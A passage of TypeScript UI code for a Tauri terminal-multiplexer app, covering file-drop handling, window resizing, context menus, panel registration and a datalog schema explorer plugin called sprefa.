  head.textContent = list.length ? "send to terminal" : "no open terminals";
  pop.appendChild(head);

  const close = () => pop.remove();
  for (const t of list) {
    const row = document.createElement("div");
    row.className = "send-row";
    const name = document.createElement("span");
    name.className = "send-name";
    name.textContent = t.name + (t.id === activeId() ? " ·" : "");
    row.appendChild(name);

    const shot = document.createElement("button");
    shot.className = "send-act";
    shot.textContent = "📷 shot";
    shot.title = "screenshot a region and send it here";
    shot.onclick = async () => {
      close();
      const path = await captureRegion();
      if (path) await sendTextToTab(t.id, path + " ");
    };
    row.appendChild(shot);

    const sendSel = document.createElement("button");
    sendSel.className = "send-act";
    sendSel.textContent = "✎ selection";
    sendSel.title = sel ? "send the highlighted text here" : "no text selected";
    sendSel.disabled = !sel;
    sendSel.onclick = () => {
      close();
      if (sel) sendTextToTab(t.id, sel + " ");
    };
    row.appendChild(sendSel);
    pop.appendChild(row);
  }

  document.body.appendChild(pop);
  const r = anchor.getBoundingClientRect();
  pop.style.left = `${Math.min(r.left, window.innerWidth - pop.offsetWidth - 8)}px`;
  pop.style.top = `${r.bottom + 2}px`;

  const onOutside = (e: PointerEvent) => {
    if (!pop.contains(e.target as Node)) {
      close();
      document.removeEventListener("pointerdown", onOutside, true);
    }
  };
  setTimeout(() => document.addEventListener("pointerdown", onOutside, true), 0);
}

function pathArg(p: string): string {
  return /\s/.test(p) ? `'${p.replace(/'/g, "'\\''")}'` : p;
}

// True from the moment a Finder drag enters until the catcher reports a drop or
// cancel. Suppresses blur-to-hide (showing the catcher blurs us) and debounces
// repeat dragenter events.
let draggingIn = false;
let dropWatchdog: number | undefined;

// Native OS file-drop without losing dockview tab-drag. The main window has the
// Tauri drag handler OFF (so HTML5 tab-drag works), which means a Finder drag
// fires a DOM dragenter here but exposes no file paths. On that dragenter we
// raise the `dropcatcher` window — the one surface WITH the native handler —
// over our exact bounds. Being always-on-top it becomes the OS drop target,
// reads the absolute paths, and emits them back via `os-file-drop`. It hides
// itself on drop/leave; a watchdog covers a cancelled drag that sends neither.
async function wireOsDrop() {
  const main = getCurrentWindow();
  const catcher = await WebviewWindow.getByLabel("dropcatcher");
  if (!catcher) return;

  const standDown = () => {
    draggingIn = false;
    if (dropWatchdog !== undefined) {
      clearTimeout(dropWatchdog);
      dropWatchdog = undefined;
    }
  };

  window.addEventListener("dragenter", async (e) => {
    if (!e.dataTransfer?.types.includes("Files")) return;
    if (draggingIn) return;
    draggingIn = true;
    cancelHide(); // the catcher taking the drag must not auto-hide us
    const pos = await main.outerPosition();
    const size = await main.outerSize();
    await catcher.setPosition(new PhysicalPosition(pos.x, pos.y));
    await catcher.setSize(new PhysicalSize(size.width, size.height));
    await catcher.show();
    // Safety net: a drag cancelled outside the app may send no drop/leave.
    dropWatchdog = window.setTimeout(() => {
      standDown();
      catcher.hide().catch(() => {});
    }, 8000);
  });

  // Catcher covers us exactly, so its drop position (physical px, window-origin)
  // maps 1:1 onto ours. Over the sprefa scope tray → add file scope; otherwise
  // paste the paths into the active terminal.
  await listen<{ paths: string[]; position: { x: number; y: number } }>(
    "os-file-drop",
    (e) => {
      standDown();
      cancelHide();
      const { paths, position } = e.payload;
      if (!paths.length) return;
      const dpr = window.devicePixelRatio || 1;
      const over = document.elementFromPoint(position.x / dpr, position.y / dpr);
      if (over?.closest("#sprefa-scope")) {
        for (const path of paths) addScope({ kind: "file", value: path });
        return;
      }
      const id = activeId();
      if (!id) return;
      pasteToActive(paths.map(pathArg).join(" ") + " ");
      tabs.get(id)?.term.focus();
    },
  );

  await listen("os-file-drop-cancel", standDown);
}

// Window edge/corner grips. decorations:false means macOS gives no native
// resize handles, and Tauri's startResizeDragging is a no-op on macOS (tao's
// drag_resize_window returns NotSupported for every direction), so we drive the
// resize ourselves: capture the pointer, track the screen-space delta, and push
// new size/position to the window. screenX/screenY are logical (CSS) px, which
// is what LogicalSize/LogicalPosition expect — no scale-factor juggling needed.
const MIN_W = 420;
const MIN_H = 320;
function wireWindowResize() {
  const win = getCurrentWindow();
  document.querySelectorAll<HTMLElement>(".rz").forEach((grip) => {
    const dir = grip.dataset.dir ?? "";
    grip.addEventListener("pointerdown", async (e) => {
      if (e.button !== 0) return;
      e.preventDefault();
      e.stopPropagation();
      const scale = await win.scaleFactor();
      const p = await win.outerPosition();
      const s = await win.outerSize();
      const ox = p.x / scale;
      const oy = p.y / scale;
      const ow = s.width / scale;
      const oh = s.height / scale;
      const startX = e.screenX;
      const startY = e.screenY;
      grip.setPointerCapture(e.pointerId);

      const onMove = (ev: PointerEvent) => {
        const dx = ev.screenX - startX;
        const dy = ev.screenY - startY;
        let w = ow;
        let h = oh;
        if (dir.includes("East")) w = ow + dx;
        if (dir.includes("West")) w = ow - dx;
        if (dir.includes("South")) h = oh + dy;
        if (dir.includes("North")) h = oh - dy;
        w = Math.max(w, MIN_W);
        h = Math.max(h, MIN_H);
        win.setSize(new LogicalSize(w, h));
        // West/North move the anchored (far) edge; keep it fixed by shifting the
        // origin so only the dragged edge tracks the cursor. Clamp-aware: derive
        // the shift from the clamped size, not the raw delta.
        if (dir.includes("West") || dir.includes("North")) {
          const nx = dir.includes("West") ? ox + (ow - w) : ox;
          const ny = dir.includes("North") ? oy + (oh - h) : oy;
          win.setPosition(new LogicalPosition(nx, ny));
        }
      };
      const onUp = (ev: PointerEvent) => {
        grip.releasePointerCapture(ev.pointerId);
        grip.removeEventListener("pointermove", onMove);
        grip.removeEventListener("pointerup", onUp);
        grip.removeEventListener("pointercancel", onUp);
      };
      grip.addEventListener("pointermove", onMove);
      grip.addEventListener("pointerup", onUp);
      grip.addEventListener("pointercancel", onUp);
    });
  });
}

// Contextual right-click items, keyed off what the click landed on. Row data is
// recovered from the row's title attr (file rows carry the path, activity rows
// the shot/url/text), so no per-row wiring is needed.
function ctxItemsFor(target: HTMLElement): CtxItem[] {
  const copy = (s: string) => navigator.clipboard.writeText(s).catch(() => {});

  // Any draggable entity (file/repo/rev) — result cells and fs rows carry these.
  const ent = target.closest("[data-entity-kind]") as HTMLElement | null;
  const entKind = ent?.dataset.entityKind as SprefaScopeKind | undefined;
  const entVal = ent?.dataset.entityValue ?? "";
  const scopeItems = (): CtxItem[] =>
    ent && entKind
      ? [
          {
            label: inScope(entKind, entVal) ? "Remove from selection" : "Add to selection",
            action: () => toggleScope(entKind, entVal),
          },
        ]
      : [];

  // A file row in the Files explorer.
  const fsRow = target.closest("#fs-list tr.dtable-row") as HTMLElement | null;
  if (fsRow?.title) {
    const path = fsRow.title;
    return [
      { label: "Open (paste path)", action: () => pasteToActive(pathArg(path) + " ") },
      { label: "Copy path", action: () => copy(path) },
      { sep: true },
      { label: "Up one folder", action: filesGoUp },
      ...(ent ? [{ sep: true } as CtxItem, ...scopeItems()] : []),
    ];
  }

  // A sprefa result cell tagged as an entity.
  if (ent && entKind) {
    const items: CtxItem[] = [...scopeItems(), { label: "Copy", action: () => copy(entVal) }];
    if (entKind === "file")
      items.push({ label: "Open (paste path)", action: () => pasteToActive(pathArg(entVal) + " ") });
    items.push(
      { sep: true },
      {
        label: "Clear selection",
        action: () => store.set({ sprefaScope: [] }),
        disabled: store.get().sprefaScope.length === 0,
      },
    );
    return items;
  }

  // An activity-timeline row.
  const actRow = target.closest("#activity-table tr.dtable-row") as HTMLElement | null;
  if (actRow?.title) {
    const data = actRow.title;
    return [
      { label: "Paste", action: () => pasteToActive(data + " ") },
      { label: "Copy", action: () => copy(data) },
    ];
  }

  // Inside a terminal.
  if (target.closest(".term-host")) {
    const id = activeId();
    const meta = id ? tabMetaById(id) : null;
    const turns = id ? tabTurns.get(id) ?? [] : [];
    const matches = id && meta ? searchTurns(turns, ledgerQuery(id, lastCtxY)) : [];
    const turnItems: CtxItem[] = [];
    const noop = () => {};
    if (matches.length && meta) {
      turnItems.push({
        label: `${matches.length} turn match${matches.length > 1 ? "es" : ""} (★ to save)`,
        action: noop,
        disabled: true,
      });
      for (const m of matches) {
        const p = m.preview.slice(0, 44);
        const star = isTurnFav(m) ? "✓" : "★";
        turnItems.push({
          label: `${star} ${m.role} · ${relTime(m.ts)} · ${p}${m.preview.length > 44 ? "…" : ""}`,
          action: () => void (isTurnFav(m) ? unfavoriteTurn(m) : favoriteTurn(m, meta.cwd)),
        });
      }
      turnItems.push({ sep: true });
    } else if (meta) {
      // No match — cache may be cold (warm for next time) or no ledger text hit.
      if (id) void warmTurns(id);
      turnItems.push({
        label: turns.length ? "no turn matches selection" : "no AI session for this tab",
        action: noop,
        disabled: true,
      });
      turnItems.push({ sep: true });
    }
    return [
      ...turnItems,
      {
        label: "Paste",
        action: async () => {
          try {
            pasteToActive(await navigator.clipboard.readText());
          } catch {
            /* clipboard blocked */
          }
        },
      },
      {
        label: "Clear",
        action: () => {
          const id = activeId();
          if (id) tabs.get(id)?.term.clear();
        },
      },
      { sep: true },
      { label: "Screenshot region", action: captureToPrompt },
    ];
  }

  // Default: window-level actions.
  return [
    {
      label: "New session",
      action: openTabAtPwd,
    },
    { sep: true },
    { label: "Cycle skin", action: () => store.set({ skin: nextSkin(store.get().skin) }) },
    {
      label: store.get().mode === "dark" ? "Light mode" : "Dark mode",
      action: () =>
        store.set({ mode: store.get().mode === "dark" ? "light" : "dark" }),
    },
  ];
}

function wireChrome() {
  $("#skin-toggle").onclick = () =>
    store.set({ skin: nextSkin(store.get().skin) });

  $("#mode-toggle").onclick = () =>
    store.set({ mode: store.get().mode === "dark" ? "light" : "dark" });

  $("#shot-btn").onclick = captureToPrompt;
  $("#send-menu-btn").onclick = (e) => openSendPicker(e.currentTarget as HTMLElement);

  for (const p of allPanels()) {
    const btn = document.getElementById(`${p.id}-toggle`);
    if (btn) btn.onclick = () => togglePanel(p.id);
  }
  $("#actbar-toggle").onclick = () =>
    store.set({ sidebar: store.get().sidebar === "big" ? "compact" : "big" });

  $("#config-reload").onclick = () =>
    invoke<ConfigView>("config_reload")
      .then((view) => store.set({ config: view }))
      .catch(console.error);
  $("#config-open").onclick = () => invoke("config_open").catch(console.error);

  $("#min-btn").onclick = () => getCurrentWindow().minimize();
  $("#max-btn").onclick = () => getCurrentWindow().toggleMaximize();
  $("#hide-btn").onclick = () => getCurrentWindow().hide();

  // Own the drag region in JS instead of `data-tauri-drag-region`: that attribute
  // only matches the exact event target, so grabbing the caption text (a child)
  // started a text-selection instead of a window drag. Listening on the bar and
  // routing by target covers every child. `e.detail === 2` is the double-click
  // (same trick Tauri's built-in uses) → maximize toggle.
  $(".title-bar").addEventListener("mousedown", (e) => {
    const me = e as MouseEvent;
    if (me.button !== 0) return;
    if ((me.target as HTMLElement).closest(".title-bar-controls")) return;
    if (me.detail === 2) getCurrentWindow().toggleMaximize();
    else getCurrentWindow().startDragging();
  });

}

function registerBuiltin() {
  registerPlugin({
    id: "builtin",
    panels: [
      {
        id: "sessions",
        title: "tmux",
        icon: "▦",
        iconUrl: "/icons/BatExec_32x32_4.png",
        iconLabel: "tmux",
        html: "",
        component: TmuxPanelV2,
        onShow: () => { refreshSessions(); },
      },
      {
        id: "worktrees",
        title: "Worktrees",
        icon: "⊞",
        iconUrl: "/icons/Explorer100_32x32_4.png",
        iconLabel: "Worktrees",
        html: "",
        component: WorktreesPanelV2,
        onShow: () => { if (store.get().worktrees.length === 0) scanWorktrees(); },
      },
      {
        id: "files",
        title: "Files",
        icon: "📁",
        iconUrl: "/icons/Folder_32x32_4.png",
        iconLabel: "Files",
        html: "",
        component: FilesPanelV2,
        onShow: () => { if (!store.get().files) loadFsRoot(store.get().fsCwd); },
      },
      {
        id: "activity",
        title: "Activity",
        icon: "◉",
        iconUrl: "/icons/Sysmon1000_32x32_4.png",
        iconLabel: "Activity",
        html: "",
        component: ActivityPanelV2,
      },
      {
        id: "favorites",
        title: "Favorites",
        icon: "★",
        iconLabel: "Favorites",
        html: "",
        component: FavoritesPanelV2,
        onShow: () => refreshFavorites(),
      },
      {
        id: "config",
        title: "Config",
        icon: "⚙",
        iconUrl: "/icons/Controls3000_32x32_4.png",
        iconLabel: "Config",
        html: `<div class="act-bar">
          <span class="spy-title">config</span>
          <span id="config-meta" class="wt-count"></span>
          <span class="spy-spacer"></span>
          <button id="config-reload" type="button">Reload</button>
          <button id="config-open" type="button">Open file</button>
        </div>
        <div id="config-body" class="cfg-body"></div>`,
        onShow: () => { if (!store.get().config) refreshConfig(); },
      },
    ],
  });
}

// ---- sprefa plugin: schema explorer over the daemon socket ----
type SprefaCol = { name: string; ty: string };
type SprefaRel = { name: string; columns: SprefaCol[]; builtin?: boolean };

const SPREFA_ROOT_KEY = "sprefa.root";
let sprefaRoot = localStorage.getItem(SPREFA_ROOT_KEY) ?? "~/projects/sprefa/v5";

function node(cls: string, ...kids: HTMLElement[]): HTMLDivElement {
  const d = document.createElement("div");
  d.className = cls;
  for (const k of kids) d.appendChild(k);
  return d;
}
function span(cls: string, text: string): HTMLSpanElement {
  const s = document.createElement("span");
  s.className = cls;
  s.textContent = text;
  return s;
}

type SprefaSite = { file: string; line: number; text: string; kind: string };

// Open a .dl/.rs file in a preview tab. `line` (>0) marks + scrolls to that row
// in the line-numbered source view; 0 opens the rendered (syntax-highlighted)
// view. Routes through the per-path tab machinery like every other preview.
function openSprefaSource(file: string, line: number) {
  openPreviewPanel(file, line > 0 ? line : undefined);
}

async function loadSprefaSites(rel: string, host: HTMLElement) {
  host.replaceChildren(node("sprefa-src-empty", span("wt-meta", "finding source…")));
  let sites: SprefaSite[] = [];
  try {
    sites = await invoke<SprefaSite[]>("sprefa_rel_source", { root: sprefaRoot, rel });
  } catch (e) {
    host.replaceChildren(node("sprefa-src-empty", span("wt-meta", String(e))));
    return;
  }
  if (sites.length === 0) {
    host.replaceChildren(
      node("sprefa-src-empty", span("wt-meta", "builtin · emitted by the engine (no .dl rule)")),
    );
    return;
  }
  host.replaceChildren();
  for (const s of sites) {
    const rel = s.file.split("/").slice(-2).join("/");
    const row = node(
      "wt-node sprefa-site",
      span("sprefa-kind sprefa-kind-" + s.kind, s.kind),
      span("wt-label", `${rel}:${s.line}`),
    );
    row.title = s.text;
    row.addEventListener("click", (e) => {
      e.stopPropagation();
      openSprefaSource(s.file, s.line);
    });
    host.appendChild(row);
  }
}

function renderSprefaSchema(rels: SprefaRel[]) {
  const tree = document.querySelector<HTMLElement>("#sprefa-schema");
  if (!tree) return;
  tree.replaceChildren();
  // Declared relations first, built-ins (source/meta tables) after; each block
  // sorted by name.
  const sorted = [...rels].sort(
    (a, b) => Number(!!a.builtin) - Number(!!b.builtin) || a.name.localeCompare(b.name),
  );
  for (const r of sorted) {
    const glyph = span("wt-glyph", "▸");
    const row = node(
      "wt-node sprefa-rel" + (r.builtin ? " sprefa-builtin" : ""),
      glyph,
      span("wt-label", r.name),
      span("wt-meta", String(r.columns.length)),
    );
    const detail = node("sprefa-detail");
    detail.hidden = true;
    const cols = node("sprefa-cols");
    for (const c of r.columns) {
      cols.appendChild(
        node("wt-node sprefa-col", span("wt-glyph", ""), span("wt-label", c.name), span("wt-meta", c.ty)),
      );
    }
    const src = node("sprefa-src");
    detail.appendChild(span("sprefa-head", "columns"));
    detail.appendChild(cols);
    detail.appendChild(span("sprefa-head", "defined in"));
    detail.appendChild(src);
    let sourced = false;
    row.addEventListener("click", () => {
      detail.hidden = !detail.hidden;
      glyph.textContent = detail.hidden ? "▸" : "▾";
      if (!detail.hidden && !sourced) {
        sourced = true;
        loadSprefaSites(r.name, src);
      }
    });
    tree.appendChild(row);
    tree.appendChild(detail);
  }
}

async function loadSprefaSchema() {
  const status = document.querySelector<HTMLElement>("#sprefa-status");
  const tree = document.querySelector<HTMLElement>("#sprefa-schema");
  if (!tree || !status) return;
  status.textContent = "loading…";
  try {
    const res = await invoke<{ relations: SprefaRel[] }>("sprefa_schema", { root: sprefaRoot });
    renderSprefaSchema(res.relations);
    const builtins = res.relations.filter((r) => r.builtin).length;
    const declared = res.relations.length - builtins;
    status.textContent = `${res.relations.length} relations (${declared} rules, ${builtins} builtin)`;
    // The loaded .dl program: ping reports the actual file set the daemon
    // parsed. Prepend it above the relation tree so it's clear which rules are
    // in effect (multiple files merge into one program).
    try {
      const ping = await invoke<{ program: string; program_files?: string[] }>("sprefa_ping", {
        root: sprefaRoot,
      });
      const files = ping.program_files?.length ? ping.program_files : [ping.program].filter(Boolean);
      const info = node("sprefa-program");
      info.append(span("sprefa-head", `loaded program${files.length === 1 ? "" : `s (${files.length})`}`));
      if (files.length === 0) info.append(span("wt-label", "(none)"));
      for (const f of files) {
        const row = span("wt-label sprefa-program-file", f.split("/").pop() ?? f);
        row.title = f;
        // Click opens the file in the Preview pane; also a draggable file entity
        // (scope tray + right-click), like result cells and fs rows.
        row.dataset.entityKind = "file";
        row.dataset.entityValue = f;
        row.draggable = true;
        row.addEventListener("click", () => openSprefaSource(f, 0));
        info.append(row);
      }
      tree.prepend(info);
    } catch {
      /* ping optional; schema already rendered */
    }
  } catch (e) {
    tree.replaceChildren();
    status.textContent = String(e);
  }
}

type SprefaQueryResult = { rel: string; columns: string[]; rows: unknown[][] };
type SprefaDiag = { severity: string; code?: string; message: string };
type SprefaEval = { ok: boolean; results: SprefaQueryResult[]; diagnostics: SprefaDiag[] };

const SPREFA_SCRATCH_KEY = "sprefa.scratch";

function showSprefaView(view: "schema" | "scratch") {
  const schema = document.querySelector<HTMLElement>("#sprefa-schema");
  const scratch = document.querySelector<HTMLElement>("#sprefa-scratch");
  if (schema) schema.hidden = view !== "schema";
  if (scratch) scratch.hidden = view !== "scratch";
  document
    .querySelector("#sprefa-tab-schema")
    ?.classList.toggle("on", view === "schema");
  document
    .querySelector("#sprefa-tab-scratch")
    ?.classList.toggle("on", view === "scratch");
  if (view === "scratch") document.querySelector<HTMLTextAreaElement>("#sprefa-scratch-src")?.focus();
}

// Classify a result column as a common entity by its header name, falling back
// to the value shape. Returns null for plain values (names, counts, lines).
function entityKind(col: string, value: string): SprefaScopeKind | null {
  if (/^repo$/i.test(col)) return "repo";
  if (/rev/i.test(col)) return "rev";
  if (/(^|_)(path|file)$/i.test(col)) return "file";
  if (!value) return null;
  if (value === "WORK" || /^[0-9a-f]{7,40}$/i.test(value)) return "rev";
  if (value.includes("/") && /\.[a-z0-9]{1,8}$/i.test(value)) return "file";
  return null;
}

// A result/header cell. When `kind` is set the cell becomes a draggable entity
// (data-entity-* attrs shared with fs rows) and gets click-to-toggle wiring via
// the global handlers. `entity-on` marks values already in the scope tray.
function cell(text: string, tag: "td" | "th" = "td", kind: SprefaScopeKind | null = null): HTMLElement {
  const el = document.createElement(tag);
  el.textContent = text;
  if (kind && tag === "td") {
    el.dataset.entityKind = kind;
    el.dataset.entityValue = text;
    el.draggable = true;
    el.className = "entity";
    if (inScope(kind, text)) el.classList.add("entity-on");
  }
  return el;
}

// ---- sprefa scope tray --------------------------------------------------

function inScope(kind: SprefaScopeKind, value: string): boolean {
  return store.get().sprefaScope.some((s) => s.kind === kind && s.value === value);
}

function addScope(item: SprefaScopeItem) {
  if (inScope(item.kind, item.value)) return;
  store.set({ sprefaScope: [...store.get().sprefaScope, item] });
}

function removeScope(kind: SprefaScopeKind, value: string) {
  store.set({
    sprefaScope: store.get().sprefaScope.filter((s) => !(s.kind === kind && s.value === value)),
  });
}

function toggleScope(kind: SprefaScopeKind, value: string) {
  if (inScope(kind, value)) removeScope(kind, value);
  else addScope({ kind, value });
}

// Datalog facts for the active selection, prepended to a scratch query so it can
// join: e.g. `scan(R, "WORK", g, _), sel_repo(R)`. Empty when scope is off/empty.
function scopePrelude(): string {
  const { sprefaScope, sprefaScopeActive } = store.get();
  if (!sprefaScopeActive || sprefaScope.length === 0) return "";
  const rels: Record<SprefaScopeKind, { rel: string; col: string }> = {
    repo: { rel: "sel_repo", col: "repo" },
    file: { rel: "sel_file", col: "path" },
    rev: { rel: "sel_rev", col: "rev" },
  };
  const lines: string[] = [];
  for (const kind of ["repo", "file", "rev"] as SprefaScopeKind[]) {
    const vals = sprefaScope.filter((s) => s.kind === kind).map((s) => s.value);
    if (!vals.length) continue;
    const { rel, col } = rels[kind];
    lines.push(`rel ${rel}(${col}: text).`);
    for (const v of vals) lines.push(`${rel}(${JSON.stringify(v)}).`);
  }
  return lines.length ? lines.join("\n") + "\n\n" : "";
}

function renderSprefaScope() {
  const host = document.querySelector<HTMLElement>("#sprefa-scope");
  if (!host) return;
  const { sprefaScope, sprefaScopeActive } = store.get();
  host.replaceChildren();
  host.classList.toggle("active", sprefaScopeActive);

  const toggle = document.createElement("button");
  toggle.type = "button";
  toggle.className = "sprefa-scope-toggle" + (sprefaScopeActive ? " on" : "");
  toggle.title = sprefaScopeActive
    ? "scope ON — sel_repo/sel_file/sel_rev facts prepended to queries"
    : "scope OFF — selection is a collection only";
  toggle.textContent = sprefaScopeActive ? "scope ●" : "scope ○";
  toggle.onclick = () => store.set({ sprefaScopeActive: !store.get().sprefaScopeActive });
  host.appendChild(toggle);

  if (sprefaScope.length === 0) {
    host.appendChild(span("wt-meta", "drag or click files/repos/revs here"));
    return;
  }
  for (const it of sprefaScope) {
    const chip = node(`sprefa-chip kind-${it.kind}`);
    chip.append(span("sprefa-chip-kind", it.kind), span("sprefa-chip-val", it.value));
    const x = document.createElement("button");
    x.type = "button";
    x.className = "sprefa-chip-x";
    x.textContent = "×";
    x.onclick = () => removeScope(it.kind, it.value);
    chip.appendChild(x);
    host.appendChild(chip);
  }
  const clear = document.createElement("button");
  clear.type = "button";
  clear.className = "sprefa-scope-clear";
  clear.textContent = "clear";
  clear.onclick = () => store.set({ sprefaScope: [] });
  host.appendChild(clear);
}

function renderSprefaEval(res: SprefaEval) {
  const out = document.querySelector<HTMLElement>("#sprefa-scratch-out");
  if (!out) return;
  out.replaceChildren();
  const errs = res.diagnostics.filter((d) => d.severity === "error");
  for (const d of errs) {
    const row = node("sprefa-diag err");
    row.textContent = `${d.code ? `[${d.code}] ` : ""}${d.message}`;
    out.appendChild(row);
  }
  if (!res.ok) return;
  if (res.results.length === 0) {
    out.appendChild(node("sprefa-src-empty", span("wt-meta", "no ? query — add e.g. ? hot(name, line).")));
    return;
  }
  for (const q of res.results) {
    const head = node("sprefa-qhead");
    head.append(span("wt-label", `? ${q.rel}`), span("wt-meta", `${q.rows.length} rows`));
    out.appendChild(head);
    const table = document.createElement("table");
    table.className = "dtable sprefa-qtable";
    const thead = document.createElement("thead");
    const htr = document.createElement("tr");
    for (const c of q.columns) htr.appendChild(cell(c, "th"));
    thead.appendChild(htr);
    table.appendChild(thead);
    const tbody = document.createElement("tbody");
    // Classify columns once from the header + first non-empty value per column.
    const kinds = q.columns.map((c, i) => {
      const sample = q.rows.find((row) => row[i] != null);
      return entityKind(c, sample ? String(sample[i]) : "");
    });
    for (const r of q.rows.slice(0, 500)) {
      const tr = document.createElement("tr");
      r.forEach((v, i) => tr.appendChild(cell(v == null ? "" : String(v), "td", kinds[i])));
      tbody.appendChild(tr);
    }
    table.appendChild(tbody);
    out.appendChild(table);
    if (q.rows.length > 500) {
      out.appendChild(node("sprefa-src-empty", span("wt-meta", `… ${q.rows.length - 500} more rows`)));
    }
  }
}

async function runSprefaScratch() {
  const src = document.querySelector<HTMLTextAreaElement>("#sprefa-scratch-src");
  const status = document.querySelector<HTMLElement>("#sprefa-scratch-status");
  if (!src || !status) return;
  const text = src.value;
  localStorage.setItem(SPREFA_SCRATCH_KEY, text);
  status.textContent = "running…";
  try {
    const res = await invoke<SprefaEval>("sprefa_eval", {
      root: sprefaRoot,
      text: scopePrelude() + text,
    });
    renderSprefaEval(res);
    const n = res.results.reduce((a, q) => a + q.rows.length, 0);
    status.textContent = res.ok ? `${n} rows` : "errors";
  } catch (e) {
    const out = document.querySelector<HTMLElement>("#sprefa-scratch-out");
    if (out) {
      const row = node("sprefa-diag err");
      row.textContent = String(e);
      out.replaceChildren(row);
    }
    status.textContent = "failed";
  }
}

const SPREFA_DND_MIME = "application/x-sprefa-entity";

// Re-render the tray and re-mark already-rendered result cells when the scope
// changes. Cheap class toggle avoids re-running the query.
function refreshSprefaScopeUI() {
  renderSprefaScope();
  document
    .querySelectorAll<HTMLElement>("#sprefa-scratch-out [data-entity-kind]")
    .forEach((el) =>
      el.classList.toggle(
        "entity-on",
        inScope(el.dataset.entityKind as SprefaScopeKind, el.dataset.entityValue ?? ""),
      ),
    );
}

let sprefaWired = false;
function wireSprefa() {
  const input = document.querySelector<HTMLInputElement>("#sprefa-root");
  if (input) input.value = sprefaRoot;
  const scratchSrc = document.querySelector<HTMLTextAreaElement>("#sprefa-scratch-src");
  if (scratchSrc && !scratchSrc.value) scratchSrc.value = localStorage.getItem(SPREFA_SCRATCH_KEY) ?? "";
  renderSprefaScope();
  if (sprefaWired) return;
  sprefaWired = true;

  // Drag any entity (result cell or fs row) -> carry its typed value.
  document.addEventListener("dragstart", (e) => {
    const el = (e.target as HTMLElement)?.closest?.("[data-entity-kind]") as HTMLElement | null;
    if (!el || !e.dataTransfer) return;
    const item = { kind: el.dataset.entityKind, value: el.dataset.entityValue ?? "" };
    e.dataTransfer.setData(SPREFA_DND_MIME, JSON.stringify(item));
    e.dataTransfer.setData("text/plain", item.value);
    e.dataTransfer.effectAllowed = "copy";
  });

  // The tray is a drop zone for in-app entity drags.
  const tray = document.querySelector<HTMLElement>("#sprefa-scope");
  tray?.addEventListener("dragover", (e) => {
    if (!e.dataTransfer?.types.includes(SPREFA_DND_MIME)) return;
    e.preventDefault();
    e.dataTransfer.dropEffect = "copy";
    tray.classList.add("drop-hover");
  });
  tray?.addEventListener("dragleave", () => tray.classList.remove("drop-hover"));
  tray?.addEventListener("drop", (e) => {
    tray.classList.remove("drop-hover");
    const raw = e.dataTransfer?.getData(SPREFA_DND_MIME);
    if (!raw) return;
    e.preventDefault();
    try {
      const it = JSON.parse(raw) as SprefaScopeItem;
      if (it.kind && it.value) addScope(it);
    } catch {
      /* malformed payload */
    }
  });

  // Left-click an entity result cell toggles it into the selection.
  document.querySelector("#sprefa-scratch-out")?.addEventListener("click", (e) => {
    const el = (e.target as HTMLElement)?.closest?.("[data-entity-kind]") as HTMLElement | null;
    if (!el) return;
    toggleScope(el.dataset.entityKind as SprefaScopeKind, el.dataset.entityValue ?? "");
  });

  store.subscribe(() => refreshSprefaScopeUI(), ["sprefaScope", "sprefaScopeActive"]);
  const form = document.querySelector<HTMLFormElement>("#sprefa-bar");
  form?.addEventListener("submit", (e) => {
    e.preventDefault();
    if (input) {
      sprefaRoot = input.value.trim();
      localStorage.setItem(SPREFA_ROOT_KEY, sprefaRoot);
    }
    loadSprefaSchema();
  });
  document.querySelector("#sprefa-tab-schema")?.addEventListener("click", () => showSprefaView("schema"));
  document.querySelector("#sprefa-tab-scratch")?.addEventListener("click", () => showSprefaView("scratch"));
  document.querySelector("#sprefa-run")?.addEventListener("click", runSprefaScratch);
  scratchSrc?.addEventListener("keydown", (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key === "Enter") {
      e.preventDefault();
      runSprefaScratch();
    }
  });
}

function registerSprefa() {
  registerPlugin({
    id: "sprefa",
    panels: [
      {
        id: "sprefa",
        title: "Sprefa",
        icon: "∿",
        iconUrl: "/icons/ComputerFind_32x32_4.png",
        iconLabel: "Sprefa",
        html: `<form id="sprefa-bar" class="wt-scan">
          <input id="sprefa-root" autocomplete="off" spellcheck="false" />
          <button type="submit">Load</button>
          <button id="sprefa-tab-schema" type="button" class="sprefa-tab on">Schema</button>
          <button id="sprefa-tab-scratch" type="button" class="sprefa-tab">Scratch</button>
          <span id="sprefa-status" class="wt-count"></span>
        </form>
        <div id="sprefa-schema" class="wt-tree"></div>
        <div id="sprefa-scratch" hidden>
          <div id="sprefa-scope" class="sprefa-scope"></div>
          <textarea id="sprefa-scratch-src" class="sprefa-scratch-src" spellcheck="false"
            placeholder="scratch datalog — runtime-only, nothing saved.&#10;&#10;rel hot(name: text, line: int).&#10;hot(name, line) &lt;-&#10;  scan(&quot;WORK&quot;, &quot;**/*.rs&quot;, p, rev),&#10;  match(p, rev, /fn\\s+(?&lt;name&gt;[a-z_]+)/, line).&#10;? hot(name, line)."></textarea>
          <div class="sprefa-scratch-bar">
            <button id="sprefa-run" type="button">Run ⌘↵</button>
            <span id="sprefa-scratch-status" class="wt-count"></span>
          </div>
          <div id="sprefa-scratch-out" class="sprefa-scratch-out"></div>
        </div>`,
        onShow: () => {
          wireSprefa();
          loadSprefaSchema();
        },
      },
    ],
  });
}

async function main() {
  // Resolve the home dir once so tildify() can stay synchronous during render.
  homeDirCached = await homeDir().catch(() => "");
  // Skin/mode are store-driven: subscribe for changes, then apply once for the
  // persisted initial state.
  store.subscribe(syncSkin, ["skin"]);
  store.subscribe(syncMode, ["mode"]);
  store.subscribe(syncSidebar, ["sidebar"]);
  // dockview owns the layout; we only react: refit the active terminal
  // whenever dockview re-lays-out a group. Panel lazy-load is handled per-panel
  // via PanelDef.onShow in the plugin registry.
  setDockHooks({
    onTermActivate: onTermShown,
    onTermClose: onTermClosed,
    onTermLayout: fitTerm,
    onTermRetitle: (sid) => applyTabTitle(sid.slice(sessionId("").length)),
  });
  store.subscribe(renderWorktreesPanel, [
    "worktrees",
    "wtView",
    "wtExpanded",
    "wtFocus",
    "wtFavorites",
    "wtAgents",
  ]);
  store.subscribe(renderConfigPanel, ["config"]);
  syncSkin(store.get());
  syncMode(store.get());
  syncSidebar(store.get());
  renderWorktreesPanel();
  // Re-apply the persisted recording flag to the backend (default off there).
  invoke("capture_set_enabled", { on: store.get().captureEnabled }).catch(
    console.error,
  );

  applyZoom(); // restore persisted webview zoom
  registerBuiltin();
  registerSprefa();
  registerV2Bridges();
  registerFilesBridge();
  registerActivityBridge();
  registerFavoritesBridge();
  refreshFavorites();
  injectPanelHtml();
  buildActivityRail();
